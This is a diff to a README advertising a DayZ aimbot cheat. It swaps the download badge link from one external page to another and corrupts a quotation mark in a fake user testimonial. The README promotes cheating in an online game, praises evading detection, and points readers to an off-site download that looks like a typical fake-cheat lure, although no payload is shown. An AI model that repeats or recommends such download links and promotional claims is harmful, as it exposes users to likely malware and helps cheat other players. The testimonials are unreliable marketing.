@@ -6,7 +6,7 @@
 
 🎮 You aim near them. The cheat handles the rest. 💥
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload14.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://DayZ-Aimbot-lun7.github.io/.github)
 ---
 
 ## 🔥 Aimbot Features for Maximum Kill Count
@@ -87,7 +87,7 @@
 
 > 🗨️ *“Headshots across airfield with an SKS… every time. Feels unfair 😈.”* – **ScopeSniper**
 
-> 🗨️ *“I run full legit mode with smooth aim — no one’s ever called me out.”* – **EZSurvivor**
+> 🗨️ *���I run full legit mode with smooth aim — no one’s ever called me out.”* – **EZSurvivor**
 
 ---
 
